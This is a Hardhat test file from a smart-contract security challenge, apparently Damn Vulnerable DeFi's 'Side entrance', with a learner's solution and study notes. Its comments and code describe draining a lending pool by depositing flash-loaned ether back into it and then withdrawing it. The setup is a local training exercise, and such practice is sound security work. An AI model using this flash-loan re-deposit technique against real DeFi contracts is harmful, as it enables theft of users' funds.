const { ethers } = require('hardhat');
const { expect, assert } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /**
         * Mappings are private so we can't change it directly
         * I was thinking i should call flashloan then desposit it back to the flashloan then call withdraw after the end of this transaction
         * Transaction 1: call flashloan then deposit it back to flashloan
         * This is so the transaction don't get reverted
         * Then call withdraw to get it all back in the second transaction
         * The solution gotta be related to interfaces
         */

        /**
         * Throught this exercise, ik my weaknesses,
         * I am still not quite clear with payable addresses
         * I am not clear with abstracts and interfaces
         * I am not clear with when to use inheritance
         */

        // const attackerPool  = await this.pool.connect(attacker);
        // await attackerPool.withdraw();
        // tx = {
        //     to:attacker.address,
        //     value:ethers.utils.parseEther("1000")
        // }
        // await attackerPool.sendTransaction(tx);


        const FlashLoanEtherRecieverActual = await ethers.getContractFactory("FlashLoanEtherRecieverActual",attacker);
        const attackerContract = await FlashLoanEtherRecieverActual.deploy(this.pool.address);
        await attackerContract.executeFlashLoan();
        await attackerContract.drain();
        // How to send money from contract to a EOA address directly in solidity?
        // tx = {
        //     to:attacker.address,
        //     value:ethers.utils.parseEther("1000")
        // }
        // await attackerContract.sendTransaction(tx);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
